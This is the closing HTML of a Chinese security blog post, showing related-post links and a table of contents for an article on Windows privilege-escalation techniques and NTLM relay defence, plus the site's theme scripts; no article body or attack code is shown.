class="next_info">Ubuntu计划任务写Shell的坑</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2021/02/11/%E5%85%8B%E9%9A%86Guest%E8%B4%A6%E6%88%B7%E6%8F%90%E6%9D%83/" title="克隆guest账户提权"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210402193846.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-11</div><div class="title">克隆guest账户提权</div></div></a></div><div><a href="/2021/05/15/Linux%E6%8F%90%E6%9D%83%E5%B0%8F%E7%BB%93/" title="Linux提权小结"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210515205900.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-05-15</div><div class="title">Linux提权小结</div></div></a></div><div><a href="/2021/02/12/MySQL%E6%8F%90%E6%9D%83/" title="MySQL提权"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210402193226.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-12</div><div class="title">MySQL提权</div></div></a></div><div><a href="/2021/02/13/SQLServer%E6%8F%90%E6%9D%83/" title="SQLServer提权"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210218112845.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-13</div><div class="title">SQLServer提权</div></div></a></div><div><a href="/2021/02/24/Windows%E4%B8%AD%E7%9A%84%E5%90%8E%E9%97%A8/" title="Windows中的后门"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210224160908.jpeg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-24</div><div class="title">Windows中的后门</div></div></a></div><div><a href="/2021/02/06/Windows%E8%AE%A4%E8%AF%81%E4%B9%8BNTLM%E5%8D%8F%E8%AE%AE/" title="Windows认证之NTLM协议"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/post/20210402194748.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-02-06</div><div class="title">Windows认证之NTLM协议</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%9B%AE%E7%9A%84"><span class="toc-number">1.</span> <span class="toc-text">目的</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E6%9C%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text">前期信息收集</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%86%85%E6%A0%B8%E6%BA%A2%E5%87%BA%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">内核溢出提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">系统配置错误提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E6%9D%83%E9%99%90%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF%E6%8F%90%E6%9D%83"><span class="toc-number">4.1.</span> <span class="toc-text">服务权限配置错误提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%86%8C%E8%A1%A8%E9%94%AE%E6%8F%90%E6%9D%83"><span class="toc-number">4.2.</span> <span class="toc-text">注册表键提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AF%E4%BF%A1%E6%9C%8D%E5%8A%A1%E8%B7%AF%E5%BE%84%E6%8F%90%E6%9D%83"><span class="toc-number">4.3.</span> <span class="toc-text">可信服务路径提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%B9%E9%87%8F%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E6%8F%90%E6%9D%83"><span class="toc-number">4.4.</span> <span class="toc-text">批量安装配置文件提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1%E6%8F%90%E6%9D%83"><span class="toc-number">4.5.</span> <span class="toc-text">计划任务提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%84%E7%AD%96%E7%95%A5%E9%A6%96%E9%80%89%E9%A1%B9%E6%8F%90%E6%9D%83"><span class="toc-number">5.</span> <span class="toc-text">组策略首选项提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%BB%95%E8%BF%87UAC%E6%8F%90%E6%9D%83"><span class="toc-number">6.</span> <span class="toc-text">绕过UAC提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%A4%E7%89%8C%E7%AA%83%E5%8F%96%E6%8F%90%E6%9D%83"><span class="toc-number">7.</span> <span class="toc-text">令牌窃取提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#ntlm-relay%E6%94%BB%E5%87%BB"><span class="toc-number">8.</span> <span class="toc-text">ntlm relay攻击</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%98%B2%E5%BE%A1"><span class="toc-number">8.1.</span> <span class="toc-text">防御</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">9.</span> <span class="toc-text">参考</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 <i style="color:#FF6A6A;animation: announ_animation 0.8s linear infinite;" class="fa fa-heartbeat"></i> V3teran</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">本地搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script data-pjax src="/js/lalala.js"></script><script src="/live2d-widget/autoload.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" data-mobile="true" data-text="爱国,和谐,友善,富强,敬业,自由,平等,民主" data-fontsize="16px" data-random="true" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
